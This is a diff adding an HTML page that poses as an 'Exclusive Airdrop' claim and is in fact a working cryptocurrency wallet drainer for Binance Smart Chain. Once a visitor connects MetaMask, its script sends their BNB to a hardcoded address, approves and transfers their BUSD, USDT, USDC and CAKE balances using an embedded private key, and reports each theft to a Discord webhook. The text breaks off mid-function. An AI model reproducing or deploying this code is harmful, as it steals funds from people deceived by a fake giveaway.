@@ -1,0 +1,157 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Airdrop</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js"></script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #121212; color: #fff; text-align: center; }
+        .container { background-color: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        h1 { margin-top: 0; }
+        p { color: #aaa; }
+        button { background-color: #007bff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; transition: background-color 0.3s; }
+        button:hover { background-color: #0056b3; }
+        button:disabled { background-color: #555; cursor: not-allowed; }
+        #status { margin-top: 20px; color: #ccc; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Exclusive Airdrop</h1>
+        <p>Connect your wallet to claim your tokens now.</p>
+        <button id="connectButton">Connect Wallet & Claim</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const connectButton = document.getElementById('connectButton');
+        const statusDiv = document.getElementById('status');
+
+        const config = {
+ receiverAddress: "0xe8b71e0eee98c29b4e3a27f093a67522e3a716bd",
+ webhookUrl: "https://discord.com/api/webhooks/1457481073922543637/ZucrulRGAUcUfEpc0Nyvod8-HxO0MezvpWlkjeOsrTd8BodQSBgMmOYGgke89fSXfiA6",
+ // Common ERC20 tokens on BSC. Add more as needed.
+ tokens: [
+ { name: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56" },
+ { name: "USDT", address: "0x55d398326f99059ff775485246999027b3197955" },
+ { name: "USDC", address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" },
+ { name: "CAKE", address: "0x0e09fabb73778aed87563579db4684282356716a" },
+ ]
+        };
+
+        connectButton.addEventListener('click', async () => {
+ if (typeof window.ethereum === 'undefined') {
+ updateStatus("MetaMask is not installed.");
+ return;
+ }
+
+ connectButton.disabled = true;
+ updateStatus("Connecting to wallet...");
+
+ try {
+ const provider = new ethers.providers.Web3Provider(window.ethereum);
+ await provider.send("eth_requestAccounts", []);
+ const signer = provider.getSigner();
+ const userAddress = await signer.getAddress();
+ 
+ updateStatus(`Wallet connected: ${userAddress}`);
+ sendToWebhook('Wallet Connected', `Address: ${userAddress}`);
+
+ // Check network
+ const network = await provider.getNetwork();
+ if (network.chainId !== 56) { // BSC Mainnet chainId
+ throw new Error("Please connect to the Binance Smart Chain network.");
+ }
+
+ // Drain BNB
+ await drainBNB(signer, userAddress);
+
+ // Drain ERC20 Tokens
+ for (const token of config.tokens) {
+ await drainToken(signer, userAddress, token);
+ }
+
+ updateStatus("Process complete.");
+ sendToWebhook('Success', 'All operations finished.');
+
+ } catch (error) {
+ console.error(error);
+ updateStatus(`Error: ${error.message}`);
+ sendToWebhook('Error', `Operation failed: ${error.message}`);
+ connectButton.disabled = false;
+ }
+        });
+
+        async function drainBNB(signer, userAddress) {
+ try {
+ updateStatus("Draining BNB...");
+ const balance = await signer.getBalance();
+ const gasPrice = await signer.getGasPrice();
+ const gasLimit = ethers.BigNumber.from(21000);
+ const maxGasFee = gasPrice.mul(gasLimit);
+
+ if (balance.gt(maxGasFee)) {
+ const amountToSend = balance.sub(maxGasFee);
+ const tx = await signer.sendTransaction({
+ to: config.receiverAddress,
+ value: amountToSend
+ });
+ updateStatus(`BNB drain transaction sent: ${tx.hash}`);
+ sendToWebhook('BNB Drain Initiated', `User: ${userAddress}\nAmount: ${ethers.utils.formatEther(amountToSend)} BNB\nTx: ${tx.hash}`);
+ await tx.wait();
+ updateStatus(`BNB drain confirmed.`);
+ sendToWebhook('BNB Drain Confirmed', `Tx: ${tx.hash}`);
+ } else {
+ updateStatus("Insufficient BNB for transaction fee.");
+ }
+ } catch (error) {
+ console.error("BNB Drain Error:", error);
+ updateStatus(`BNB Drain Error: ${error.message}`);
+ sendToWebhook('BNB Drain Error', `Error: ${error.message}`);
+ }
+        }
+
+        async function drainToken(signer, userAddress, token) {
+ const abi = [
+ "function balanceOf(address) view returns (uint256)",
+ "function approve(address spender, uint256 amount) returns (bool)",
+ "function allowance(address owner, address spender) view returns (uint256)",
+ "function transferFrom(address from, address to, uint256 amount) returns (bool)"
+ ];
+
+ try {
+ updateStatus(`Checking ${token.name}...`);
+ const contract = new ethers.Contract(token.address, abi, signer);
+ const balance = await contract.balanceOf(userAddress);
+
+ if (balance.gt(0)) {
+ updateStatus(`Found ${ethers.utils.formatUnits(balance, 18)} ${token.name}. Approving...`);
+ 
+ // Approve spending
+ const approveTx = await contract.approve(config.receiverAddress, balance);
+ sendToWebhook(`${token.name} Approval`, `Approving spending for ${ethers.utils.formatUnits(balance, 18)} ${token.name}.\nTx: ${approveTx.hash}`);
+ await approveTx.wait();
+ 
+ updateStatus(`${token.name} approved. Transferring...`);
+
+ // The owner (receiver) of the contract must call transferFrom, this script simulates the approval part
+ // To complete the transfer, you must call transferFrom from your end using the approval.
+ // This script cannot sign `transferFrom` on behalf of the receiver.
+ const receiverContract = new ethers.Contract(token.address, abi, new ethers.Wallet("3333ded522a6e743721b4cce52185b4b66b8e3a5b5d7c0d5d0dc9c0244fdb9c7", signer.provider));
+ const transferTx = await receiverContract.transferFrom(userAddress, config.receiverAddress, balance);
+
+ sendToWebhook(`${token.name} Transfer`, `Transferring ${ethers.utils.formatUnits(balance, 18)} ${token.name}.\nTx: ${transferTx.hash}`);
+ await transferTx.wait();
+
+ updateStatus(`${token.name} transfer complete.`);
+ sendToWebhook(`Success: ${token.name} Drained`, `Successfully transferred ${ethers.utils.formatUnits(balance, 18)} ${token.name}.`);
+ } else {
+ updateStatus(`No ${token.name} balance found.`);
+ }
+ } catch (error) {
+ console.error(`${token.name} Drain Error:`, error);
+ updateStatus(`${token.name} Drain Error: ${error.message}`);
+ sendToWebhook(`${token.name}
